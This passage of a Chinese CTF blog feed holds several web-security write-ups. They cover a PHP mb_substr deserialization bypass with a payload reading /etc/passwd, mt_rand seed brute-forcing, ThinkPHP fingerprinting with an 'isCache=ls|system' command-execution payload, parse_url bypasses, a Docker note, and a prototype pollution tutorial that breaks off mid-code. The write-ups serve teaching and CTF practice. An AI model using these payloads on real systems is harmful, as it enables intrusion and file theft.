class="line"></span><br><span class="line">相比较，前面多了一串：</span><br><span class="line">O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:126:&quot;</span><br><span class="line">刚好多了38个字符，就可以通过传参read来利用上述漏洞，让他们错位38个索引</span><br></pre></td></tr></table></figure><blockquote><p>payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?read=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9f%9fa%f0%9f%9fa&amp;start=O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:55:&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>接下来分析一下，传进去后，在传入截取函数前，它们会组合成：</p><p>%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9f%9fa%f0%9f%9fa[O:9:“read_file”:2:{s:5:“start”;s:126:“O:9:“read_file”:2:{s:5:“start”;s:9:“gxngxngxn”;s:8:“filename”;s:55:“php://filter/convert.base64-encode/resource=/etc/passwd”;}”;s:8:“filename”;s:11:“/etc/passwd”;}]</p><p>根据上述漏洞，mb_strpos索引&quot;[“时，会索引到 12x4+2x2+1-1 = 52，即”[&quot;下标是52</p><p>mb_substr在截取时，就会从下标为53的截取。 53=12x1+1x2+1+38+1-1，刚好绕过了前面的38个字符串，从而反序列化我们自己传入的序列化表。</p></blockquote>]]></content>
    
    
    <summary type="html">🥧mb_strpos与mb_substr错位索引</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="web姿势" scheme="https://m3x1.cn/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>随机数种子爆破</title>
    <link href="https://m3x1.cn/posts/b4b5a295.html"/>
    <id>https://m3x1.cn/posts/b4b5a295.html</id>
    <published>2024-11-25T16:00:00.000Z</published>
    <updated>2024-12-02T08:49:30.846Z</updated>
    
    <content type="html"><![CDATA[<h2 id="随机数种子爆破">随机数种子爆破</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165931510.png" alt="image-20241116165931510"></p><p>在PHP中，变量以$符号开头，后面拼接变量名。上述代码的基本 含义是:从$str变量中随机取32次字符(字符可重复)，并拼接成字符 串，最后将该字符串赋值给变量$password。执行代码后会输出 $password变量的前10个字节，此时通过POST请求传递password参数到 服务端，如果password参数的值与$password变量的值完全相等，那么 就会输出flag。</p><p>理论上，如果选取字符的时候是完全随机的，那么几乎不可能出现 password参数值与$password变量值相等的情况(概率极低)。但由于 代码中使用mt_rand()函数来生成随机数，因此如果可以得知该函数生 成的一段随机数序列，就可以通过工具爆破出其选取的随机数种子 (该种子由$_Session[‘seed’]变量生成)，从而预测之后的所有随机数序 列。在这里，我们使用php_mt_seed工具来爆破随机数种子。该工具的 下载地址为:<a href="https://www.openwall.com/php_mt_seed/php_mt_seed-">https://www.openwall.com/php_mt_seed/php_mt_seed-</a> 4.0.tar.gz</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165647076.png" alt="image-20241116165647076"></p><p>访问题目页面，可得到前10个字节的随机字符，将输出的随机字符转换为php_mt_seed可识别的数据格式。使用</p><p>Python3脚本进行转换:</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165703575.png" alt="image-20241116165703575"></p><p>str1变量的值就是PHP代码中的$str的值，str2变量的值就是PHP代码中 输出的$password的前10个字节。这段代码的基本作用就是将$password 中的前10个字节(即变量str2)进行定位，得到其在str1中的具体下标 位置，然后按照具体格式输出。以str2中的第一个字母A为例，字母A 在变量str1中的下标是36(字符串下标从0开始)</p><p>将输出的字符输入到编译好的php_mt_seed工具中，具体指令如下:</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165734372.png" alt="image-20241116165734372"></p><p>最终我们找到一个随机数种子 19290735(PHP7.1)。在这一步需要注意的是，mt_rand()函数本身确 实存在问题，但是根据PHP版本的不同，其生成的随机数会略有区别。 所以，在实际题目中一定要注意PHP版本问题，不能脱离PHP版本来做 题。</p><p>利用得到的随机数种子编写PHP脚本，如下所示:</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165751773.png" alt="image-20241116165751773"></p><p>尝试将该结果提交给服务端，即可成功得到flag。</p><p>本质上是因为mt_rand()函数的不安全性导致的。所以，我们需要明确 以下几点:</p><ol><li>mt_rand()函数的不安全性是考点的核心。</li></ol><p>2)要爆破随机数种子，首先需要得到mt_rand()函数生成的随机数序</p><p>列。</p><p>3)mt_rand()函数生成的随机数序列可能以不同的形式表现(例如生成 随机字符串)。</p><p>4)相同函数在不同的PHP版本(大版本)中的实现代码可能是不一样 的。例如，在PHP7和PHP5中，mt_rand()函数的实现算法是完全不同 的。</p><p>5)计算机中不存在真正的随机数，这是mt_rand()函数存在安全问题的 根本原因。</p>]]></content>
    
    
    <summary type="html">🥧随机数种子爆破</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="web姿势" scheme="https://m3x1.cn/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>tp漏洞</title>
    <link href="https://m3x1.cn/posts/3b315222.html"/>
    <id>https://m3x1.cn/posts/3b315222.html</id>
    <published>2024-11-24T16:00:00.000Z</published>
    <updated>2024-12-02T09:04:15.023Z</updated>
    
    <content type="html"><![CDATA[<h1>tp漏洞</h1><h2 id="一-识别tp框架-指纹">一-识别tp框架(指纹)</h2><h3 id="1-1-ioc判断">1.1 ioc判断</h3><p>/favicon.ico</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20516b1e8de85b6b95343771b66b44df.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125193711067.png" alt="image-20241125193711067"></p><h3 id="1-2报错">1.2报错</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1c8c509ef3f760f24376d38f6a7625c8.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3b4ccc2eacbbf6163c0ef584d7aeb544.png" alt="img"></p><p>或者 /index.php/index/index/1</p><h3 id="1-3错误传参">1.3错误传参</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/479046ae0c8bf91e2d32d17acc474db9.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ebf2fd7c4ce6bf62b49083a7085bd599.png" alt="img"></p><h3 id="1-4特殊指纹出现logo">1.4特殊指纹出现logo</h3><p>/?c=4e5e5d7364f443e28fbf0d3ae744a59a</p><p>/4e5e5d7364f443e28fbf0d3ae744a59a</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3ddc4ccf08674da045f360091d24546e.png" alt="img"></p><p>p3.1和3.2版本</p><p>4e5e5d7364f443e28fbf0d3ae744a59a-index.html</p><h3 id="1-5-body特征">1.5 body特征</h3><p>body里有&quot;十年磨一剑&quot; 或者&quot;ThinkPHP&quot;</p><h3 id="1-6插件">1.6插件</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0684f3dbf50af3128a16c0a775d03eb4.png" alt="img"></p><h2 id="二、利用方法">二、利用方法</h2><p>数据通过竖线分开, 前面为参数, 后面为函数。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?cacheTime=0&amp;isCache=ls|system  </span><br><span class="line">/index.php/?cacheTime=0&amp;isCache=ls|system   #上面不行就换下面</span><br></pre></td></tr></table></figure><p>根据 thinkphp 的路由规则：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">由于ThinkPHP存在两种路由规则，如下所示</span><br><span class="line">http://serverName/index.php/模块/控制器/操作/[参数名/参数值...]</span><br><span class="line">如果不支持PATHINFO的服务器可以使用兼容模式访问如下：</span><br><span class="line">http://serverName/index.php?s=/模块/控制器/操作/[参数名/参数值...]</span><br><span class="line">也可采用 index.php/a/b/c/$&#123;code&#125;一下形式。</span><br></pre></td></tr></table></figure><p>访问 <code>/index.php/index/index</code>，能够走到题目给出的<code>Index\index</code>里。</p><p>所以一般要先加上路由路径。</p>]]></content>
    
    
    <summary type="html">🥧tp漏洞</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="web姿势" scheme="https://m3x1.cn/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>docker保存和打包镜像</title>
    <link href="https://m3x1.cn/posts/5721bfe4.html"/>
    <id>https://m3x1.cn/posts/5721bfe4.html</id>
    <published>2024-11-23T16:00:00.000Z</published>
    <updated>2024-12-02T09:09:58.908Z</updated>
    
    <content type="html"><![CDATA[<h2 id="docker保存和打包镜像">docker保存和打包镜像</h2><p>作用：在现在容器镜像上保存镜像进行打包，在另一台服务上使用；或现有的容器安装了一些库，配置了开发环境，需要保存下载，下次加载后直接使用。</p><h4 id="1-1-首先查看下现有容器镜像（目的是查询需要保存镜像的ID）">1.1 首先查看下现有容器镜像（目的是查询需要保存镜像的ID）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><h4 id="1-2-接下来用commit参数进行保存镜像（精简版）">1.2 接下来用commit参数进行保存镜像（精简版）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit  7ca736d99653    yolov5:v6.2</span><br></pre></td></tr></table></figure><p>其中，7ca736d99653 是需要保存镜像的ID，刚才用docker ps -a 查询到的。</p><h2 id="打包tar">打包tar</h2><p>使用save参数进行打包，格式如：docker save -o  tar文件名称     镜像REPOSITORY:TAG</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save -o yolov5-v6.2.tar yolov5:v6.2</span><br></pre></td></tr></table></figure><p>其中yolov5:v6.2 是需要保存镜像的REPOSITORY、和TAG；也是上面保存的镜像名称。</p>]]></content>
    
    
    <summary type="html">🥧docker保存和打包镜像</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="其他姿势" scheme="https://m3x1.cn/tags/%E5%85%B6%E4%BB%96%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>parse_url函数</title>
    <link href="https://m3x1.cn/posts/f885edb3.html"/>
    <id>https://m3x1.cn/posts/f885edb3.html</id>
    <published>2024-11-23T16:00:00.000Z</published>
    <updated>2024-12-02T09:02:40.921Z</updated>
    
    <content type="html"><![CDATA[<p>parse_url函数<br>作用：parse_url — 解析 URL，返回其组成部分</p><p>mixed parse_url ( string $url [, int $component = -1 ] )<br>本函数解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。</p><p>参数：<br>url：要解析的 URL。无效字符将使用 _ 来替换。</p><p>component：<br>指定 PHP_URL_SCHEME、 PHP_URL_HOST、 PHP_URL_PORT、 PHP_URL_USER、 PHP_URL_PASS、 PHP_URL_PATH、PHP_URL_QUERY 或 PHP_URL_FRAGMENT 的其中一个来获取 URL 中指定的部分的 string。 （除了指定为PHP_URL_PORT 后，将返回一个 integer 的值）。</p><p>对严重不合格的 URL，parse_url() 可能会返回 FALSE （CTF常用 返回值False 用于逃逸判断）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">DEMO</span><br><span class="line">&lt;?php</span><br><span class="line">$url = &#x27;http://username:password@hostname/path?arg=value#anchor&#x27;;</span><br><span class="line">print_r(parse_url($url));</span><br><span class="line">echo parse_url($url, PHP_URL_PATH);</span><br><span class="line">?&gt;</span><br><span class="line">结果----------------------------------------------------------------------------------------------------</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname</span><br><span class="line">    [user] =&gt; username</span><br><span class="line">    [pass] =&gt; password</span><br><span class="line">    [path] =&gt; /path</span><br><span class="line">    [query] =&gt; arg=value</span><br><span class="line">    [fragment] =&gt; anchor</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>这里我们还输出了当前$url的PHP_URL_PATH 发现是 /path<br>那么如果我们这里把$url中的/path去掉 发现输出的则为 NULL</p><p>tips：parse_url()会把//认为是相对路径（5.4.7以前）<br>如果我们</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = &#x27;//www.example.com/path?googleguy=googley&#x27;;</span><br><span class="line"> </span><br><span class="line">// 在 5.4.7 之前这会输出路径 &quot;//www.example.com/path&quot;</span><br><span class="line">var_dump(parse_url($url));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="2016asisctf的一道web题-DEMO1">2016asisctf的一道web题 DEMO1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$data = parse_url($_SERVER[&#x27;REQUEST_URI&#x27;]); </span><br><span class="line">var_dump($data);</span><br><span class="line">$filter=array(&quot;aaa&quot;,&quot;qqqq&quot;);</span><br><span class="line">foreach($filter as $f)</span><br><span class="line">&#123; </span><br><span class="line">if(preg_match(&quot;/&quot;.$f.&quot;/i&quot;, $data[&#x27;query&#x27;]))</span><br><span class="line">&#123; </span><br><span class="line">die(&quot;Attack Detected&quot;); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8493b71d2534228680bc92134d48817d.png" alt="img"></p><p>这里query中的参数有aaa 被preg_match匹配到 所以拦截了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/260d79001d32b5306fb9f046839ee920.png" alt="img"></p><p>这里test.php前面加了一个/ 导致把test.php? 认为成了host 相对的来说 /aaa/xxx 也就成为了路径 这也可以说是一个绕过吧</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a6c48f242ca38058c92a1bc195e6c365.png" alt="img"></p><p>这里test.php前面再多加了一个/ 导致 严重不合格的 URL，parse_url() 返回FALSE 这个是通用的绕过方法</p>]]></content>
    
    
    <summary type="html">🥧parse_url函数</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="web姿势" scheme="https://m3x1.cn/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>深入理解 JavaScript Prototype 污染攻击</title>
    <link href="https://m3x1.cn/posts/575ed4b2.html"/>
    <id>https://m3x1.cn/posts/575ed4b2.html</id>
    <published>2024-11-23T16:00:00.000Z</published>
    <updated>2024-12-02T08:49:14.702Z</updated>
    
    <content type="html"><![CDATA[<h1>深入理解 JavaScript Prototype 污染攻击</h1><h2 id="1、prototype和-proto-分别是什么？">1、<code>prototype</code>和<code>__proto__</code>分别是什么？</h2><p>JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function Foo() &#123;</span><br><span class="line">    this.bar = 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new Foo()</span><br></pre></td></tr></table></figure><p><code>Foo</code>函数的内容，就是<code>Foo</code>类的构造函数，而<code>this.bar</code>就是<code>Foo</code>类的一个属性。</p><blockquote><p>为了简化编写JavaScript代码，ECMAScript 6后增加了<code>class</code>语法，但<code>class</code>其实只是一个语法糖。</p></blockquote><p>一个类必然有一些方法，类似属性<code>this.bar</code>，我们也可以将方法定义在构造函数内部：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function Foo() &#123;</span><br><span class="line">    this.bar = 1</span><br><span class="line">    this.show = function() &#123;</span><br><span class="line">        console.log(this.bar)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(new Foo()).show()</span><br></pre></td></tr></table></figure><p>但这样写有一个问题，就是每当我们新建一个Foo对象时，<code>this.show = function...</code>就会执行一次，这个<code>show</code>方法实际上是绑定在对象上的，而不是绑定在“类”中。</p><p>我希望在创建类的时候只创建一次<code>show</code>方法，这时候就则需要使用原型（prototype）了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function Foo() &#123;</span><br><span class="line">    this.bar = 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Foo.prototype.show = function show() &#123;</span><br><span class="line">    console.log(this.bar)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let foo = new Foo()</span><br><span class="line">foo.show()</span><br></pre></td></tr></table></figure><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/46109c07-bfa1-4b92-93a2-d86049274035.png"><img src="https://www.leavesongs.com/media/attachment/2019/04/03/46109c07-bfa1-4b92-93a2-d86049274035.0dcd4f4c4400.png" alt="image.png"></a></p><p>我们可以认为原型<code>prototype</code>是类<code>Foo</code>的一个属性，而所有用<code>Foo</code>类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的<code>foo</code>对象，其天生就具有<code>foo.show()</code>方法。</p><p>我们可以通过<code>Foo.prototype</code>来访问<code>Foo</code>类的原型，但<code>Foo</code>实例化出来的对象，是不能通过prototype访问原型的。这时候，就该<code>__proto__</code>登场了。</p><p>一个Foo类实例化出来的foo对象，可以通过<code>foo.__proto__</code>属性来访问Foo类的原型，也就是说：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo.__proto__ == Foo.prototype</span><br></pre></td></tr></table></figure><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/3c4ed224-ae7b-4c8c-b16d-12b56524efee.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3c4ed224-ae7b-4c8c-b16d-12b56524efee.e270c75493b0.png" alt="image.png"></a></p><p>所以，总结一下：</p><ol><li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li><li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li></ol><h2 id="0x02-JavaScript原型链继承"><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript">0x02 JavaScript原型链继承</a></h2><p>所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现JavaScript中的继承机制。</p><p>比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function Father() &#123;</span><br><span class="line">    this.first_name = &#x27;Donald&#x27;</span><br><span class="line">    this.last_name = &#x27;Trump&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Son() &#123;</span><br><span class="line">    this.first_name = &#x27;Melania&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Son.prototype = new Father()</span><br><span class="line"></span><br><span class="line">let son = new Son()</span><br><span class="line">console.log(`Name: $&#123;son.first_name&#125; $&#123;son.last_name&#125;`)</span><br></pre></td></tr></table></figure><p>Son类继承了Father类的<code>last_name</code>属性，最后输出的是<code>Name: Melania Trump</code>。</p><p>总结一下，对于对象son，在调用<code>son.last_name</code>的时候，实际上JavaScript引擎会进行如下操作：</p><ol><li>在对象son中寻找last_name</li><li>如果找不到，则在<code>son.__proto__</code>中寻找last_name</li><li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li><li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li></ol><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/08c5d5d0-62da-40f9-9e2c-77831fa7488e.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/08c5d5d0-62da-40f9-9e2c-77831fa7488e.51324dd04eef.png" alt="image.png"></a></p><p>JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。</p><p>以上就是最基础的JavaScript面向对象编程，我们并不深入研究更细节的内容，只要牢记以下几点即可：</p><ol><li>每个构造函数(constructor)都有一个原型对象(prototype)</li><li>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></li><li>JavaScript使用prototype链实现继承机制</li></ol><h2 id="0x03-原型链污染是什么"><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x03">0x03 原型链污染是什么</a></h2><p>第一章中说到，<code>foo.__proto__</code>指向的是<code>Foo</code>类的<code>prototype</code>。那么，如果我们修改了<code>foo.__proto__</code>中的值，是不是就可以修改Foo类呢？</p><p>做个简单的实验：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// foo是一个简单的JavaScript对象</span><br><span class="line">let foo = &#123;bar: 1&#125;</span><br><span class="line"></span><br><span class="line">// foo.bar 此时为1</span><br><span class="line">console.log(foo.bar)</span><br><span class="line"></span><br><span class="line">// 修改foo的原型（即Object）</span><br><span class="line">foo.__proto__.bar = 2</span><br><span class="line"></span><br><span class="line">// 由于查找顺序的原因，foo.bar仍然是1</span><br><span class="line">console.log(foo.bar)</span><br><span class="line"></span><br><span class="line">// 此时再用Object创建一个空的zoo对象</span><br><span class="line">let zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line">// 查看zoo.bar</span><br><span class="line">console.log(zoo.bar)</span><br></pre></td></tr></table></figure><p>最后，虽然zoo是一个<strong>空</strong>对象<code>&#123;&#125;</code>，但<code>zoo.bar</code>的结果居然是2：</p><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/4b63f1ef-6ed8-4448-9644-f11620822aaf.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/4b63f1ef-6ed8-4448-9644-f11620822aaf.2b2425c31fdb.png" alt="image.png"></a></p><p>原因也显而易见：因为前面我们修改了foo的原型<code>foo.__proto__.bar = 2</code>，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。</p><p>后来，我们又用Object类创建了一个zoo对象<code>let zoo = &#123;&#125;</code>，zoo对象自然也有一个bar属性了。</p><p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p><h2 id="0x04-哪些情况下原型链会被污染？"><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x04">0x04 哪些情况下原型链会被污染？</a></h2><p>在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？</p><p>我们思考一下，哪些情况下我们可以设置<code>__proto__</code>的值呢？其实找找能够控制数组（对象）的“键名”的操作即可：</p><ul><li>对象merge</li><li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li></ul><p>以对象merge为例，我们想象一个简单的merge函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function merge(target, source) &#123;</span><br><span class="line">    for (let key in source) &#123;</span><br><span class="line">        if (key in source &amp;&amp; key in target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在合并的过程中，存在赋值的操作<code>target[key] = source[key]</code>，那么，这个key如果是<code>__proto__</code>，是不是就可以原型链污染呢？</p><p>我们用如下代码实验一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">let o1 = &#123;&#125;</span><br><span class="line">let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</span><br><span class="line">merge(o1, o2)</span><br><span class="line">console.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line">console.log(o3.b)</span><br></pre></td></tr></table></figure><p>结果是，合并虽然成功了，但原型链没有被污染：</p><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/ba16d965-3112-4f69-bf5e-4eddb034e6dc.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ba16d965-3112-4f69-bf5e-4eddb034e6dc.c5e82ea6e4f5.png" alt="image.png"></a></p><p>这是因为，我们用JavaScript创建o2的过程（<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>）中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p><p>那么，如何让<code>__proto__</code>被认为是一个键名呢？</p><p>我们将代码改成如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">let o1 = &#123;&#125;</span><br><span class="line">let o2 = JSON.parse(&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;)</span><br><span class="line">merge(o1, o2)</span><br><span class="line">console.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line">console.log(o3.b)</span><br></pre></td></tr></table></figure><p>可见，新建的o3对象，也存在b属性，说明Object已经被污染：</p><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/5e05a46f-3c7b-4ab4-869c-fe6fd19422b7.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5e05a46f-3c7b-4ab4-869c-fe6fd19422b7.64db1b9bbae7.png" alt="image.png"></a></p><p>这是因为，JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p><p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。</p><h2 id="0x05-Code-Breaking-2018-Thejs-分析"><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x05-code-breaking-2018-thejs">0x05 Code-Breaking 2018 Thejs 分析</a></h2><p>我在Code-Breaking 2018中出了一道原型链污染的CTF题目，为了更加贴合真实环境，我没有刻意加太多自己的代码，后端主要代码如下（完整代码可参考<a href="https://github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js">这里</a>）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 